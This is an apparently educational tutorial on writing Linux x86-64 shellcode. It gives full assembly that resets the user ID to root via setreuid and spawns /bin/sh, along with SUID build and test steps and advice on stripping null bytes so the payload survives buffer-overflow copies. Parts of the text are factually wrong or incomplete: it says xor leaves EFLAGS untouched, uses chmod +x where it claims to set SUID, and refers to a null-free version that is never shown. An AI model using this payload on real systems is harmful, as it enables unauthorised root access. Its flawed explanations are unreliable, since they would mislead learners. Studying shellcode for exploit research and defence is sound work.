# ShellCodes
* * *
Shellcode is a set of machine code instructions typically written in assembly language such as x86, designed to be executed directly by a computer's processor. Because assembly's instructions are architecture-specific that restricts the portability of shellcodes among different processors. In general, shellcode focuses on direct manipulation of processor registers, configuring them for various system calls using opcodes. Once the assembly code is crafted to execute the desired operation, then it must be converted into machine code. However, this will not be enough, removing all null bytes is crucial. The reason is that many string operations, such as strcpy(), stop when encountering null bytes.

To better understand shellcodes, let's examine first System Calls (syscall)

## System Calls (syscall)

To invoke functions for tasks like opening system ports or modifying permissions, it's essential to utilize system calls, which serve as a means to manage communication with hardware and access kernel functionality that might not be present in the application's address space. On UNIX-based operating systems, each function is assigned a unique system call number. 

For instacne, when a user-level program needs to access a function beyond its address space, such as setuid(), it must first determine the system call number associated with setuid() function. Then, it triggers an interrupt which signals to the operating system that a request needs attention. The actual numbers assigned to each system call can vary between operating systems. In Linux, for instance, syscall numbers are defined in the kernel headers. One esay way to get the system call number is to use `ausyscall` tool
```sh
# Ubuntu 64-bit architecture
sudo apt install auditd
ausyscall --dump
```

As in the case of most system calls, one or more arguments are necessary. The system call number is loaded into the EAX register, while the arguments intended for the desired function are typically loaded into EBX, ECX, and EDX, following this order. In 64-bit architecture, the arguments for system call are placed in RDI, RSI, RDX, RCX, R8 and R9 in that order.

## Example
- In this example, we will use the appropriate system calls to write a message to the standard output.
```asm
; Ubuntu 64-bit architecture
section .data
    msg db 'System Calls', 0

section .text
    global main

main:
    ; let's write to stdout
    ; ssize_t write(int fildes, const void *buf, size_t nbyte);
	  ; syscall is passed in rax register
    mov rax, 1          ; system call number for write
	
	  ; Function parameters are passed in the registers rdi, rsi, and rdx, respectively.
    mov rdi, 1          ; fildes -> 1 for stdout
    mov rsi, msg        ; buf -> pointer to the message
    mov rdx, 12         ; nbyte -> number of chars in the message
    syscall             ; trigger an interrupt by invoking syscall

    ; syscall to exit
    ; void exit(int status);
    mov rax, 60         ; system call number for exit
	
	  ; One parameter passed in the register rdi
    xor rdi, rdi        ; exit code 0
    syscall             ; trigger an interrupt by invoking syscall
```

- Compilation & Execution
```sh
nasm -f elf64 syscall1.asm
gcc syscall1.o -o syscall1
./syscall1
```

### Note
- In 32-bit x86 systems, the int 0x80 instruction is commonly employed to initiate an interrupt. In 64-bit systems, this is substituted with the syscall instruction.

***

## Creating Shellcode
As a general security best-practices, applications typically drop their privileges whenever possible. To enable our shellcode to call a root shell, we must invoke a function that restores the application's privileges. This can be achieved using the `setreuid()` system call. Therefor, our objective is to create a position-independent assembly code that calls a root shell. 



## Netwide Assembler (NASM)
To assemble our shellcode and extract the machine instructions, we first need to use an assembler. The NASM is an x86 and x86-64 assembler that supports several object file formats, including ELF, Win32, and others. You can specify the object file format with the `-f` switch. Because we need our code to be position-independent, we must NOT link it.

The following code first escalates its privileges by setting the effective user ID to zero and then spawns a shell with the newly acquired privileges using the execve system call. After compiling it, we grant ownership to the root user and enable the SetUID (SUID) permission. This configuration enables our shellcode to showcase the process of reverting ownership to the root user.

```s
; Env: Ubuntu 64-bit architecture
section .data
    msg db '/bin/sh',0

section .text
	global main

main:
; Step 1: Set Effective User ID to zero
; int setreuid(uid_t ruid, uid_t euid)
	mov rax, 0 				; clearing rax
	mov rdi, 0 				; passing argument 0 in rdi to setreuid()
	mov rsi, 0 				; passing argument 0 in rsi to setreuid()
	mov rax, 113 		 ; 113 = 0x71 is the syscall for setreuid() in the current environment
	syscall 					; trigger an interrupt to execute setreuid()

; Step 2: Spawn a shell
; int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
	mov rax, 0					 ; clearing rax
	push qword [msg]	  ; placing the address /bin/sh onto the stack.
	mov rdi, rsp 			 ; rsp points to the address of /bin/sh on stack, thus we store it in rdi
	push rax						; rax was set to 0, this serves as a null terminator.
	push rdi					  ; rdi is the first argument to execve, it contains the address of /bin/sh.
	mov rsi, rsp			 ; rsi is the second argument to execve, it contains the string /bin/sh.
	mov rdx, 0					; setting Null in the third argument to execve()
	mov rax, 59				  ; store system call number (59 = 0x3B) for execve() in rax
	syscall						  ; trigger an interrupt to execute execve()
```

- Compilation & Execution
```sh
nasm -f elf64 syscall2.s
gcc syscall2.o -o syscall2

# change ownership ans set SUID
sudo chown root:root syscall2
sudo chmod +x syscall2

# execute
./syscall2
```

Looking at the xxd output, it's clear that our shellcode contains a lot of null bytes, which is a problem. In many exploitation scenarios, we often rely on string manipulation functions like strcpy() or gets() to copy data into a buffer. However, when these functions encounter a null byte (0x00), they interpret it as the end of the string, leading to the failure of our shellcode execution.
```sh
# dump machine code
xxd -ps syscall2.o | head
	# -ps display the machine code without any hexadecimal translation.
```

## Removing Null Bytes
Quite a few assembly instructions cause null bytes to reside within your shellcode. For example, if you try to move 10 (0x0a) into eax, it results in '0x0000000a', leaving 3 null bytes. These null bytes again terminate many string operations and break your shellcode. There are tricks to get around this type of issue. Remember that 32-bit registers are 4 bytes, but smaller portions of these registers can be accessed directly. The lower 8-bit of eax, can be accessed directly by referencing the register name al. 

Passing a 0 as an argument to a system call. You will most commonly see the use of the instruction xor eax, eax to zero out a register, as it does not modify the EFLAGS register. When you XOR something with itself, the result is always 0. Another way to zero out a register is to subtract it from itself; for example, sub eax, eax will zero out EAX. You can move an existing register whose value is 0 with the instruction mov eax, ecx. The problem with these instructions is they increase the size of your shellcode much more than they should. Let's check again

```sh
# assemble the code
nasm -f elf64 syscall2.s

# dump machine code
xxd -ps syscall2 | head
	# -ps display the machine code without any hexadecimal translation.
```

After assembling this version with NASM and inspecting the machine code using xxd in base16 format, we find that the null bytes have been successfully eliminated. Additionally, the size of the shellcode has significantly reduced to just 35 bytes. There are also compact instructions, such as "cdq" and "xch," that can help you save space in your code.

## Test Shellcode

```
gcc shellcode_tester.c -o shellcode
sudo chown root:root shellcode
sudo chmod +s shellcode
./shellcode
```
We then assign ownership to root and turn on SUID. This allows our shellcode to demonstrate the restoring of root privileges prior to spawning a shell. After executing shellcode if you run the id command you should get uid=0
